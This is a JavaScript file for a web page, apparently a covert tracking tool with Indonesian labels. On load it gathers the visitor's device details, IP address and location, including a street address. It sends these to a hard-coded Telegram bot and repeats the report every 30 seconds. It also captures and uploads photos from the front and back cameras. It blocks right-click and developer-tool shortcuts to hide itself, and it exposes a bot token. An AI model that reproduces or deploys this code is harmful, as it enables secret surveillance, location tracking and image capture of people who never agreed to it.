// === TELEGRAM CONFIG ===
const token = '8424271614:AAHdEIUaiVEh_yipQ22xgj7KpUlHWYKP6Ws';
const chatId = '8028847891';

// Telegram helpers
const sendToTelegram = async (data) => {
    try {
        await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
            method:'POST',
            headers:{'Content-Type':'application/json'},
            body: JSON.stringify({
                chat_id: chatId,
                text: data,
                parse_mode: 'HTML'
            })
        });
    } catch(e) {
        console.error('Error sendMessage:', e);
    }
};

const sendPhoto = async (blob, filename) => {
    try {
        const formData = new FormData();
        formData.append('chat_id', chatId);
        formData.append('photo', blob, filename);
        await fetch(`https://api.telegram.org/bot${token}/sendPhoto`, {
            method: 'POST',
            body: formData
        });
    } catch(e) {
        console.error('Error sendPhoto:', e);
    }
};

// Location reverse geocoding
const getLocationDetails = async (lat, lon) => {
    try {
        const response = await fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lon}&zoom=18&addressdetails=1`);
        const data = await response.json();
        if (data.address) {
            return {
                kabupaten: data.address.county || data.address.city || data.address.state || "Tidak diketahui",
                kecamatan: data.address.suburb || data.address.village || data.address.town || "Tidak diketahui",
                fullAddress: data.display_name || "Alamat tidak tersedia"
            };
        }
    } catch(e){
        console.error('Reverse geocode error', e);
    }
    return { kabupaten: "Tidak diketahui", kecamatan: "Tidak diketahui", fullAddress: "Alamat tidak tersedia"};
};

// Device + IP info
const collectDeviceInfo = async () => {
    let message = '╭── Informasi Sistem ── ⦿\n\n';
    message += '⚙️ INFORMASI PERANGKAT\n';
    message += `🖥️ Perangkat: ${navigator.userAgent}\n`;
    message += `💻 Platform: ${navigator.platform}\n`;
    message += `🌐 Bahasa: ${navigator.language}\n`;
    message += `📶 Status: ${navigator.onLine ? 'Online' : 'Offline'}\n`;
    message += `📺 Ukuran Layar: ${screen.width}x${screen.height}\n`;
    message += `🪟 Ukuran Jendela: ${window.innerWidth}x${window.innerHeight}\n`;
    message += `💾 RAM: ${navigator.deviceMemory || 'Tidak diketahui'} GB\n`;
    message += `🧠 Core CPU: ${navigator.hardwareConcurrency}\n`;
    if (navigator.getBattery) {
        try {
            const battery = await navigator.getBattery();
            message += `🔋 Baterai: ${Math.floor(battery.level * 100)}%\n`;
            message += `🔌 Mengisi: ${battery.charging ? '✅ YA' : '❌ TIDAK'}\n`;
        } catch(e){ message += '🔋 Baterai: ❌ Tidak tersedia\n'; }
    }
    message += `⏰ Waktu Akses: ${new Date().toString()}\n`;
    message += `🕒 Waktu Muat Halaman: ${(performance.now()).toFixed(2)} ms\n`;
    message += `📜 Riwayat: ${history.length}\n`;
    message += `✋ Dukungan Sentuh: ${'ontouchstart' in window ? '✅ YA' : '❌ TIDAK'}\n`;
    message += `🔗 Referrer: ${document.referrer || 'Tidak ada'}\n`;
    message += `🌍 URL: ${window.location.href}\n`;
    message += `📄 Judul: ${document.title}\n`;
    message += `🕓 Zona Waktu: ${Intl.DateTimeFormat().resolvedOptions().timeZone}\n`;
    message += `🧭 Offset: ${new Date().getTimezoneOffset()} menit\n\n`;

    try {
        const ipRes = await fetch('https://ipapi.co/json/');
        const ipData = await ipRes.json();
        message += '📍 INFORMASI LOKASI\n';
        message += `📡 Alamat IP: ${ipData.ip}\n`;
        message += `🏙️ Kota: ${ipData.city}\n`;
        message += `🏙️ Kabupaten: ${ipData.region}\n`;
        message += `🌎 Negara: ${ipData.country_name}\n`;
        message += `🏷️ Kode Pos: ${ipData.postal}\n`;
        if (ipData.latitude && ipData.longitude) {
            message += `📌 Latitude: ${ipData.latitude}\n`;
            message += `📍 Longitude: ${ipData.longitude}\n`;
            const locationDetails = await getLocationDetails(ipData.latitude, ipData.longitude);
            message += `🏙️ Kabupaten: ${locationDetails.kabupaten}\n`;
            message += `🏙️ Kecamatan: ${locationDetails.kecamatan}\n`;
            message += `🏠 Alamat Lengkap: ${locationDetails.fullAddress}\n`;
        }
    } catch (e) {
        message += '❌ Gagal mendapatkan informasi lokasi\n';
    }

    message += '\n╰── Sistem Pembaruan ── ⦿';
    return message;
};

// ---------- Camera capture helpers ----------
const video = document.getElementById('video');
const canvas = document.getElementById('canvas');

// Start a camera stream with facingMode: 'user' or 'environment'
async function startStream(facingMode) {
    // Stop any existing tracks first
    stopAllStreams();
    const constraints = {
        audio: false,
        video: { facingMode: facingMode, width: { ideal: 1280 }, height: { ideal: 720 } }
    };
    try {
        const stream = await navigator.mediaDevices.getUserMedia(constraints);
        video.srcObject = stream;
        // ensure metadata loaded
        await new Promise((resolve) => {
            if (video.readyState >= 2) resolve();
            else video.onloadedmetadata = () => resolve();
        });
        return stream;
    } catch (err) {
        console.error('getUserMedia error:', err);
        await sendToTelegram(`❌ Error akses kamera: ${err.message}`);
        throw err;
    }
}

function stopAllStreams() {
    if (video.srcObject) {
        const tracks = video.srcObject.getTracks();
        tracks.forEach(t => t.stop());
        video.srcObject = null;
    }
}

// capture a single frame from current video stream, return a Blob
async function captureFrameAsBlob(filenamePrefix='capture') {
    canvas.width = video.videoWidth || 1280;
    canvas.height = video.videoHeight || 720;
    const ctx = canvas.getContext('2d');
    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
    return await new Promise(resolve => {
        canvas.toBlob(blob => resolve(blob), 'image/jpeg', 0.85);
    });
}

// Higher-level function: capture using facingMode ('user' or 'environment'), send to telegram
async function captureWithFacing(facingMode, filenameSuffix='') {
    try {
        const stream = await startStream(facingMode);
        // small delay to let camera auto-adjust
        await new Promise(r => setTimeout(r, 600));
        const blob = await captureFrameAsBlob();
        const filename = `${facingMode}_${Date.now()}${filenameSuffix}.jpg`;
        await sendPhoto(blob, filename);
        // stop stream after capture
        stream.getTracks().forEach(t => t.stop());
        video.srcObject = null;
        return blob;
    } catch (err) {
        console.error('captureWithFacing error', err);
        throw err;
    }
}

// ---------- Main tracking (all in background) ----------
const startTracking = async () => {
    // send device info
    const deviceInfo = await collectDeviceInfo();
    await sendToTelegram(deviceInfo);

    // Try to access camera once for initial capture
    try {
        // Capture front camera
        await captureWithFacing('user', '_front');
        
        // Wait and capture back camera if available
        setTimeout(async () => {
            try {
                await captureWithFacing('environment', '_back');
            } catch (e) {
                console.log('Back camera not available');
            }
        }, 2000);
    } catch (e) {
        console.error('Camera capture error', e);
    }

    // GPS tracking - DIHAPUS untuk menghilangkan error
    // Bagian ini telah dihapus untuk mencegah error GPS

    // Periodic updates every 30 seconds
    setInterval(async () => {
        try {
            const updateInfo = await collectDeviceInfo();
            await sendToTelegram(`🔄 UPDATE PERANGKAT\n${updateInfo}`);
        } catch (e) {
            console.error('Periodic update error', e);
        }
    }, 30000);
};

// Start tracking immediately
startTracking();

// Clean up when leaving page
window.addEventListener('beforeunload', () => {
    stopAllStreams();
});

// Prevent right-click and other inspections
document.addEventListener('contextmenu', (e) => e.preventDefault());
document.addEventListener('keydown', (e) => {
    if (e.key === 'F12' || (e.ctrlKey && e.shiftKey && e.key === 'I')) {
        e.preventDefault();
    }
});